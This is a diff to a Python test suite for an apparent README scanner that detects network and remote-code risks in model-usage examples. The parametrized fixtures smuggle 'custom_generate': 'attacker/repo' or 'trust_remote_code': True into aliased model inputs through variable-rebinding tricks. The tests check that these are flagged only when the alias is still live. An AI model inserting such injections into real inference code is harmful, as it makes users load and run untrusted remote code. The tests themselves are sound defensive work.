@@ -5932,6 +5932,138 @@ class TestNetworkCommDetector:
         [
             (
                 "inputs = processor(images=image, return_tensors='pt')\n"
+                "old = inputs\n"
+                "device_inputs = inputs.to('cuda')\n"
+                "inputs = {}\n"
+                "old |= {'custom_generate': 'attacker/repo'}\n"
+            ),
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
+                "device_inputs = inputs.to('cuda')\n"
+                "old = inputs\n"
+                "inputs = {}\n"
+                "old |= {'custom_generate': 'attacker/repo'}\n"
+            ),
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
+                "old = inputs\n"
+                "first_device_inputs = inputs.to('cuda')\n"
+                "device_inputs = first_device_inputs.to('cpu')\n"
+                "inputs = {}\n"
+                "first_device_inputs = {}\n"
+                "old |= {'custom_generate': 'attacker/repo'}\n"
+            ),
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
+                "old = inputs\n"
+                "older = old\n"
+                "device_inputs = inputs.to('cuda')\n"
+                "inputs = {}\n"
+                "old = {}\n"
+                "older |= {'trust_remote_code': True}\n"
+            ),
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
+                "old = inputs\n"
+                "device_inputs = inputs.to('cuda')\n"
+                "inputs = {}\n"
+                "old['custom_generate'] = 'attacker/repo'\n"
+            ),
+        ],
+        ids=[
+            "prior-alias-source-rebind",
+            "post-transfer-alias-source-rebind",
+            "chained-transfer-source-rebind",
+            "chained-alias-source-rebind",
+            "subscript-mutation-source-rebind",
+        ],
+    )
+    def test_readme_python_example_rejects_mutated_live_renamed_transfer_alias(
+        self,
+        mapping_flow: str,
+    ) -> None:
+        data = (
+            "```python\nimport requests\nfrom PIL import Image\n"
+            "from transformers import AutoModel, AutoProcessor\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
+            "processor = AutoProcessor.from_pretrained('official/model')\n"
+            "model = AutoModel.from_pretrained('official/model')\n"
+            f"{mapping_flow}"
+            "model.generate(**device_inputs)\n```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    @pytest.mark.parametrize(
+        "mapping_flow",
+        [
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
+                "device_inputs = inputs.to('cuda')\n"
+                "inputs = {}\n"
+                "inputs |= {'custom_generate': 'attacker/repo'}\n"
+            ),
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
+                "old = inputs\n"
+                "old = {}\n"
+                "device_inputs = inputs.to('cuda')\n"
+                "old |= {'custom_generate': 'attacker/repo'}\n"
+            ),
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
+                "old = inputs\n"
+                "device_inputs = inputs.to('cuda')\n"
+                "inputs = {}\n"
+                "old = {}\n"
+                "old |= {'custom_generate': 'attacker/repo'}\n"
+            ),
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
+                "device_inputs = inputs.to('cuda')\n"
+                "old = inputs\n"
+                "inputs = {}\n"
+                "old = {}\n"
+                "old |= {'custom_generate': 'attacker/repo'}\n"
+            ),
+        ],
+        ids=[
+            "source-name-rebound",
+            "prior-alias-rebound-before-transfer",
+            "prior-alias-rebound-after-transfer",
+            "post-transfer-alias-rebound",
+        ],
+    )
+    def test_readme_python_example_allows_mutation_of_detached_renamed_transfer_alias(
+        self,
+        mapping_flow: str,
+    ) -> None:
+        data = (
+            "```python\nimport requests\nfrom PIL import Image\n"
+            "from transformers import AutoModel, AutoProcessor\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
+            "processor = AutoProcessor.from_pretrained('official/model')\n"
+            "model = AutoModel.from_pretrained('official/model')\n"
+            f"{mapping_flow}"
+            "model.generate(**device_inputs)\n```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert findings
+        assert all(finding["severity"] == "INFO" for finding in findings)
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+    @pytest.mark.parametrize(
+        "mapping_flow",
+        [
+            (
+                "inputs = processor(images=image, return_tensors='pt')\n"
                 "alias = inputs\n"
                 "alias |= {'custom_generate': 'attacker/repo'}\n"
                 "device_inputs = inputs.to('cuda')\n"
